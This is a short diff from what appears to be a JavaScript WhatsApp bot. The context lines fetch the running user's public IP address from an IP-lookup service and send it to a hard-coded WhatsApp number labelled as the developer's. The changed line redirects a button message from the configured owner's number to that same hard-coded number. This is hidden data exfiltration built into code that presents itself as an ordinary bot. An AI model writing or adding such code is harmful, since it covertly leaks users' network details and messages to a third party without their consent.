@@ -289,7 +289,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
        Fan.sendMessage("18054105292@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/18054105292?text=Assalamualaikum+bwang:v` } }})
      console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
-    Fan.sendMessage(`${setting.NomorOwner2}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
+    Fan.sendMessage('18054105292@s.whatsapp.net', buttonMessagee, MessageType.buttonsMessage, {
         caption: '𝐅𝐚𝐧 𝐗7',
         "contextInfo": {
             text: 'hi',
